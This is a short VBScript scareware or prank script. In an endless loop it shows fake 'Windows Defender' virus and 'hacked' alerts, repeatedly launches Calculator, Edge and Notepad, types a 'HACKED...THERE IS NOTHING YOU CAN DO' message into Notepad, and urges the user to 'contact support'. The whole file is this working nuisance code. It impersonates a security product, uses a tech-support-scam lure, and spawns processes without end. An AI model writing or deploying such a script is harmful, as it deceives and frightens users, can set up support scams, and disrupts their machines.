Set wshShell = CreateObject("WScript.Shell")

Do
    MsgBox "Virus Detected! A threat has been found on your system!", vbCritical + vbOKOnly, "Windows Defender"
    MsgBox "Your system has been hacked!", vbCritical, "Warning!"
    
    

    
    wshShell.Run "calc"
    wshShell.Run "msedge"
    wshShell.Run "notepad"

    
    WScript.Sleep 1000

    
    wshShell.AppActivate "Notepad"
    WScript.Sleep 500
    wshShell.SendKeys "HACKED...........THERE IS NOTHING YOU CAN DO"

    
    WScript.Sleep 2000
    
    MsgBox "Virus Detected! Your PC is at risk. Please contact support!", vbCritical, "Windows Defender"
    


Loop
